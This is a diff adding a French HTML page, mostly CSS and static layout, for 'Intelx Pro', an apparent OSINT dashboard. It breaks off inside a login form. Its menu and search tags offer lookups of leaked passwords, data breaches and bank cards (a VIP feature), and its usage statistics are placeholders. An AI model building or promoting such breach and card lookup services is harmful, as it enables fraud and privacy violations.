@@ -1,0 +1,2308 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intelx Pro | Recherche OSINT Avancée</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0f172a;
+            --secondary: #1e293b;
+            --accent: #3b82f6;
+            --accent-dark: #2563eb;
+            --accent-light: #93c5fd;
+            --text: #f8fafc;
+            --text-light: #94a3b8;
+            --text-lighter: #cbd5e1;
+            --card-bg: #1e293b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-highlight: rgba(255, 255, 255, 0.15);
+            --gradient-primary: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            --gradient-danger: linear-gradient(135deg, var(--danger), #dc2626);
+            --gradient-success: linear-gradient(135deg, var(--success), #059669);
+            --gradient-warning: linear-gradient(135deg, var(--warning), #d97706);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background-color: var(--primary);
+            color: var(--text);
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(at 80% 0%, hsla(189, 100%, 56%, 0.1) 0px, transparent 50%),
+                radial-gradient(at 0% 50%, hsla(355, 100%, 93%, 0.1) 0px, transparent 50%);
+            overflow-x: hidden;
+        }
+
+        /* Layout */
+        .app-container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background-color: var(--secondary);
+            padding: 1.5rem;
+            border-right: 1px solid var(--glass-border);
+            position: fixed;
+            width: 280px;
+            height: 100vh;
+            backdrop-filter: blur(10px);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 2rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--text);
+        }
+
+        .logo-icon {
+            color: var(--accent);
+            font-size: 1.8rem;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-menu {
+            list-style: none;
+            margin-top: 1rem;
+            flex: 1;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent) var(--secondary);
+        }
+
+        .nav-menu::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .nav-menu::-webkit-scrollbar-track {
+            background: var(--secondary);
+        }
+
+        .nav-menu::-webkit-scrollbar-thumb {
+            background-color: var(--accent);
+            border-radius: 6px;
+        }
+
+        .nav-item {
+            margin-bottom: 0.5rem;
+            position: relative;
+        }
+
+        .nav-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0.75rem 1rem;
+            color: var(--text-light);
+            text-decoration: none;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-link::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.2), transparent);
+            transition: all 0.6s ease;
+        }
+
+        .nav-link:hover::before, .nav-link.active::before {
+            left: 100%;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background-color: rgba(59, 130, 246, 0.1);
+            color: var(--accent);
+            transform: translateX(5px);
+        }
+
+        .nav-link i {
+            width: 24px;
+            text-align: center;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+
+        .nav-badge {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: var(--danger);
+            color: white;
+            font-size: 0.7rem;
+            padding: 0.2rem 0.5rem;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+
+        .sidebar-footer {
+            margin-top: auto;
+            padding-top: 1.5rem;
+            border-top: 1px solid var(--glass-border);
+            font-size: 0.8rem;
+            color: var(--text-light);
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .sidebar-footer a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .sidebar-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Content */
+        .main-content {
+            grid-column: 2;
+            padding: 2.5rem;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .page-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+        }
+
+        .page-title::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            border-radius: 2px;
+        }
+
+        .user-menu {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .notification-btn {
+            background: none;
+            border: none;
+            color: var(--text-light);
+            font-size: 1.2rem;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s;
+        }
+
+        .notification-btn:hover {
+            color: var(--accent);
+            transform: translateY(-2px);
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background-color: var(--danger);
+            color: white;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.6rem;
+            font-weight: 700;
+        }
+
+        .search-container {
+            position: relative;
+            width: 100%;
+            max-width: 900px;
+            margin: 0 auto 2.5rem;
+        }
+
+        .search-box {
+            display: flex;
+            background-color: var(--secondary);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            border: 1px solid var(--glass-border);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+            position: relative;
+            z-index: 2;
+        }
+
+        .search-box::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #3b82f6, #8b5cf6, #3b82f6);
+            z-index: -1;
+            border-radius: 14px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .search-box:focus-within {
+            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.3);
+            border-color: rgba(59, 130, 246, 0.4);
+        }
+
+        .search-box:focus-within::before {
+            opacity: 0.5;
+        }
+
+        .search-input {
+            flex: 1;
+            padding: 1.2rem 1.8rem;
+            border: none;
+            background: transparent;
+            color: var(--text);
+            font-size: 1.05rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .search-input:focus {
+            outline: none;
+        }
+
+        .search-input::placeholder {
+            color: var(--text-light);
+            opacity: 0.7;
+        }
+
+        .search-btn {
+            padding: 0 2rem;
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .search-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        .search-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.6rem;
+            margin-top: 1.2rem;
+            justify-content: center;
+        }
+
+        .search-tag {
+            background-color: rgba(59, 130, 246, 0.15);
+            color: var(--accent);
+            padding: 0.6rem 1.2rem;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            font-weight: 500;
+        }
+
+        .search-tag:hover, .search-tag.active {
+            background: var(--gradient-primary);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        /* Results Section */
+        .results-section {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.8rem;
+            margin-top: 2rem;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+
+        .results-section:hover {
+            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.2);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.8rem;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .section-title i {
+            color: var(--accent);
+        }
+
+        .results-count {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            background-color: rgba(59, 130, 246, 0.1);
+            padding: 0.4rem 0.8rem;
+            border-radius: 20px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .result-item {
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--glass-border);
+            transition: all 0.3s;
+            border-radius: 8px;
+            margin-bottom: 0.5rem;
+            background-color: rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .result-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: var(--gradient-primary);
+            transition: all 0.3s;
+            opacity: 0;
+        }
+
+        .result-item:hover::before {
+            opacity: 1;
+        }
+
+        .result-item:hover {
+            background-color: rgba(255,255,255,0.03);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .result-title {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--accent);
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .result-title i {
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .result-meta {
+            display: flex;
+            gap: 1.5rem;
+            font-size: 0.85rem;
+            color: var(--text-light);
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .meta-item i {
+            color: var(--accent-light);
+        }
+
+        .result-content {
+            color: var(--text-light);
+            margin-bottom: 1.2rem;
+            line-height: 1.7;
+        }
+
+        .result-actions {
+            display: flex;
+            gap: 0.8rem;
+        }
+
+        .btn {
+            padding: 0.6rem 1.2rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            color: var(--accent);
+            border: 1px solid var(--accent);
+        }
+
+        .btn-outline:hover {
+            background-color: rgba(59, 130, 246, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-danger {
+            background: var(--gradient-danger);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+            color: white;
+        }
+
+        .btn-success:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+
+        /* Auth Modal */
+        .auth-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .auth-container {
+            background-color: var(--secondary);
+            border-radius: 16px;
+            width: 100%;
+            max-width: 450px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            animation: fadeInUp 0.4s ease-out;
+            border: 1px solid var(--glass-border);
+            transform-origin: center;
+        }
+
+        .auth-header {
+            background: var(--gradient-primary);
+            padding: 1.5rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .auth-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255,255,255,0.1) 0%,
+                rgba(255,255,255,0) 60%
+            );
+            transform: rotate(30deg);
+        }
+
+        .auth-title {
+            color: white;
+            font-size: 1.4rem;
+            font-weight: 600;
+            position: relative;
+        }
+
+        .auth-body {
+            padding: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.95rem;
+            color: var(--text-light);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.9rem 1.2rem;
+            background-color: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-light);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .password-toggle:hover {
+            color: var(--accent);
+        }
+
+        .form-submit {
+            width: 100%;
+            padding: 1rem;
+            background: var(--gradient-primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 0.5rem;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-submit::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255,255,255,0.2) 0%,
+                rgba(255,255,255,0) 60%
+            );
+            transform: rotate(30deg);
+            transition: all 0.3s;
+            opacity: 0;
+        }
+
+        .form-submit:hover::after {
+            opacity: 1;
+        }
+
+        .form-submit:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+        }
+
+        .auth-footer {
+            text-align: center;
+            padding: 1.5rem;
+            border-top: 1px solid var(--glass-border);
+            font-size: 0.9rem;
+            color: var(--text-light);
+        }
+
+        .auth-link {
+            color: var(--accent);
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .auth-link:hover {
+            text-decoration: underline;
+        }
+
+        .auth-tabs {
+            display: flex;
+            border-bottom: 1px solid var(--glass-border);
+            margin-bottom: 1.5rem;
+        }
+
+        .auth-tab {
+            flex: 1;
+            text-align: center;
+            padding: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            border-bottom: 3px solid transparent;
+            color: var(--text-light);
+            position: relative;
+        }
+
+        .auth-tab.active {
+            border-bottom: 3px solid var(--accent);
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .auth-tab::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--gradient-primary);
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+            transform-origin: right;
+        }
+
+        .auth-tab:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        .auth-tab.active::after {
+            transform: scaleX(1);
+        }
+
+        /* Notification Modal */
+        .notification-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            width: 350px;
+            background-color: var(--secondary);
+            z-index: 1000;
+            box-shadow: -5px 0 15px rgba(0,0,0,0.2);
+            border-left: 1px solid var(--glass-border);
+            transform: translateX(100%);
+            transition: transform 0.3s ease-out;
+            flex-direction: column;
+        }
+
+        .notification-overlay.active {
+            transform: translateX(0);
+        }
+
+        .notification-header {
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .notification-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--text);
+        }
+
+        .close-notifications {
+            background: none;
+            border: none;
+            color: var(--text-light);
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .close-notifications:hover {
+            color: var(--danger);
+            transform: rotate(90deg);
+        }
+
+        .notification-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1rem;
+        }
+
+        .notification-item {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 0.5rem;
+            background-color: rgba(0, 0, 0, 0.2);
+            border-left: 3px solid var(--accent);
+            transition: all 0.3s;
+        }
+
+        .notification-item:hover {
+            background-color: rgba(255,255,255,0.03);
+        }
+
+        .notification-item.unread {
+            background-color: rgba(59, 130, 246, 0.1);
+            border-left: 3px solid var(--danger);
+        }
+
+        .notification-time {
+            font-size: 0.7rem;
+            color: var(--text-light);
+            margin-top: 0.3rem;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .notification-footer {
+            padding: 1rem;
+            border-top: 1px solid var(--glass-border);
+            text-align: center;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .app-container {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                position: static;
+                width: 100%;
+                height: auto;
+            }
+            .main-content {
+                grid-column: 1;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .main-content {
+                padding: 1.5rem;
+            }
+            .search-box {
+                flex-direction: column;
+            }
+            .search-input {
+                padding: 1rem;
+            }
+            .search-btn {
+                padding: 0.8rem;
+                justify-content: center;
+            }
+            .section-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1rem;
+            }
+            .result-actions {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+            .notification-overlay {
+                width: 100%;
+            }
+        }
+
+        /* Floating particles background */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background-color: rgba(59, 130, 246, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 120px;
+            background-color: var(--secondary);
+            color: var(--text);
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.8rem;
+            border: 1px solid var(--glass-border);
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: var(--accent);
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Badge */
+        .badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            font-size: 0.7rem;
+            font-weight: 600;
+            border-radius: 20px;
+            margin-left: 0.5rem;
+        }
+
+        .badge-primary {
+            background: var(--gradient-primary);
+            color: white;
+        }
+
+        .badge-danger {
+            background: var(--gradient-danger);
+            color: white;
+        }
+
+        .badge-success {
+            background: var(--gradient-success);
+            color: white;
+        }
+
+        .badge-warning {
+            background: var(--gradient-warning);
+            color: white;
+        }
+
+        /* Progress bar */
+        .progress-container {
+            width: 100%;
+            background-color: var(--glass);
+            border-radius: 10px;
+            margin: 1rem 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: var(--gradient-primary);
+            border-radius: 10px;
+            transition: width 0.4s ease;
+        }
+
+        /* Code block */
+        .code-block {
+            background-color: rgba(0, 0, 0, 0.3);
+            border-radius: 6px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+            border-left: 3px solid var(--accent);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid var(--glass-border);
+            margin-bottom: 1.5rem;
+        }
+
+        .tab {
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s;
+            font-weight: 500;
+            color: var(--text-light);
+        }
+
+        .tab.active {
+            border-bottom: 3px solid var(--accent);
+            color: var(--accent);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Status indicator */
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+
+        .status-online {
+            background-color: var(--success);
+            box-shadow: 0 0 5px var(--success);
+        }
+
+        .status-offline {
+            background-color: var(--danger);
+        }
+
+        .status-warning {
+            background-color: var(--warning);
+            box-shadow: 0 0 5px var(--warning);
+        }
+
+        /* Context menu */
+        .context-menu {
+            position: absolute;
+            background-color: var(--secondary);
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 100;
+            border: 1px solid var(--glass-border);
+            display: none;
+            min-width: 200px;
+            overflow: hidden;
+        }
+
+        .context-menu-item {
+            padding: 0.8rem 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .context-menu-item:hover {
+            background-color: var(--glass-highlight);
+        }
+
+        .context-menu-item i {
+            width: 20px;
+            text-align: center;
+        }
+
+        .context-menu-divider {
+            height: 1px;
+            background-color: var(--glass-border);
+            margin: 0.3rem 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating particles -->
+    <div class="particles" id="particles"></div>
+
+    <div class="app-container">
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="logo">
+                <i class="fas fa-shield-alt logo-icon"></i>
+                <span>Intelx Pro</span>
+            </div>
+            
+            <ul class="nav-menu">
+                <li class="nav-item">
+                    <a href="#" class="nav-link active">
+                        <i class="fas fa-search"></i>
+                        <span>Recherche Avancée</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-envelope"></i>
+                        <span>Recherche Email</span>
+                        <span class="nav-badge">Nouveau</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-user"></i>
+                        <span>Recherche Personne</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-phone"></i>
+                        <span>Recherche Téléphone</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-globe"></i>
+                        <span>Recherche Domaine</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-credit-card"></i>
+                        <span>Recherche Carte Bancaire</span>
+                        <span class="nav-badge">VIP</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-database"></i>
+                        <span>Bases de Données</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-history"></i>
+                        <span>Historique</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a href="#" class="nav-link">
+                        <i class="fas fa-cog"></i>
+                        <span>Paramètres</span>
+                    </a>
+                </li>
+            </ul>
+
+            <div class="sidebar-footer">
+                <div>
+                    <span class="status-indicator status-online"></span>
+                    <span>Statut: En ligne</span>
+                </div>
+                <div>v3.2.1 | Build 4729</div>
+                <div>
+                    <a href="#"><i class="fas fa-question-circle"></i> Aide</a> | 
+                    <a href="#"><i class="fas fa-file-alt"></i> Docs</a>
+                </div>
+                <div>© 2025 Intelx Pro</div>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="header">
+                <h1 class="page-title">Recherche OSINT Professionnelle</h1>
+                <div class="user-menu">
+                    <button class="notification-btn" id="notification-btn">
+                        <i class="fas fa-bell"></i>
+                        <span class="notification-badge">3</span>
+                    </button>
+                    <button class="btn btn-outline" id="auth-btn">
+                        <i class="fas fa-user"></i> Connexion
+                    </button>
+                </div>
+            </div>
+
+            <div class="search-container">
+                <div class="search-box">
+                    <input type="text" class="search-input" id="search-input" placeholder="Entrez une adresse email, nom d'utilisateur, numéro de téléphone, adresse IP...">
+                    <button class="search-btn" id="search-btn">
+                        <i class="fas fa-search"></i> Analyser
+                    </button>
+                </div>
+                <div class="search-options">
+                    <div class="search-tag active">Tout</div>
+                    <div class="search-tag">Emails</div>
+                    <div class="search-tag">Mots de passe</div>
+                    <div class="search-tag">Réseaux sociaux</div>
+                    <div class="search-tag">Fuites de données</div>
+                    <div class="search-tag">Historique web</div>
+                    <div class="search-tag">Documents</div>
+                    <div class="search-tag">Images</div>
+                </div>
+            </div>
+
+            <div class="results-section">
+                <div class="section-header">
+                    <div>
+                        <h2 class="section-title"><i class="fas fa-list"></i> Résultats de recherche</h2>
+                        <div class="results-count" id="results-count">Aucune recherche effectuée</div>
+                    </div>
+                    <div class="result-actions">
+                        <button class="btn btn-outline tooltip" id="filter-btn">
+                            <i class="fas fa-filter"></i> Filtrer
+                            <span class="tooltiptext">Filtrer les résultats</span>
+                        </button>
+                        <button class="btn btn-outline tooltip" id="sort-btn">
+                            <i class="fas fa-sort-amount-down"></i> Trier
+                            <span class="tooltiptext">Trier les résultats</span>
+                        </button>
+                        <button class="btn btn-outline tooltip" id="export-btn">
+                            <i class="fas fa-download"></i> Exporter
+                            <span class="tooltiptext">Exporter les résultats</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div id="results-container">
+                    <div class="result-item">
+                        <div class="result-content">
+                            <p>Utilisez la barre de recherche ci-dessus pour lancer une analyse. Notre système interroge plus de 1,400 bases de données et sources OSINT en temps réel.</p>
+                            <div class="progress-container">
+                                <div class="progress-bar" style="width: 0%"></div>
+                            </div>
+                            <p class="result-meta" style="margin-top: 1rem;">
+                                <span class="meta-item"><i class="fas fa-database"></i> 1,426 sources disponibles</span>
+                                <span class="meta-item"><i class="fas fa-clock"></i> Mise à jour il y a 2 minutes</span>
+                                <span class="meta-item"><i class="fas fa-shield-alt"></i> Sécurité: Niveau 4</span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="results-section" style="margin-top: 2rem;">
+                <div class="section-header">
+                    <h2 class="section-title"><i class="fas fa-chart-line"></i> Statistiques du système</h2>
+                </div>
+                <div class="result-content">
+                    <div class="result-meta">
+                        <span class="meta-item"><i class="fas fa-server"></i> Requêtes aujourd'hui: 12,489</span>
+                        <span class="meta-item"><i class="fas fa-bolt"></i> Temps de réponse moyen: 1.2s</span>
+                        <span class="meta-item"><i class="fas fa-user-shield"></i> Utilisateurs actifs: 843</span>
+                    </div>
+                    <div style="margin-top: 1rem;">
+                        <p>Dernières mises à jour du système:</p>
+                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                            <li>Ajout de 34 nouvelles bases de données (20/07/2025)</li>
+                            <li>Amélioration de l'algorithme de recherche (18/07/2025)</li>
+                            <li>Correction des problèmes de performance (15/07/2025)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Auth Modal -->
+    <div class="auth-overlay" id="auth-overlay">
+        <div class="auth-container">
+            <div class="auth-header">
+                <h2 class="auth-title" id="auth-modal-title">Connexion à Intelx Pro</h2>
+            </div>
+            <div class="auth-tabs">
+                <div class="auth-tab active" id="login-tab">Connexion</div>
+                <div class="auth-tab" id="register-tab">Créer un compte</div>
+            </div>
+            <div class="auth-body">
+                <form id="login-form">
+                    <div class="form-group">
+                        <label for="login-email" class="form-label">Adresse Email</label>
+                        <input type="email" class="form-input" id="login-email" placeholder="email@exemple.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="login-password" class="form-label">Mot de passe</label>
+                        <input type="password" class="form-input" id="login-password" placeholder="••••••••" required>
+                        <i class="fas fa-eye password-toggle" id="login-toggle"></i>
+                    </div>
+                    <button type="submit" class="form-submit">
+                        <i class="fas fa-sign-in-alt"></i> Se connecter
+                    </button>
+                </form>
+
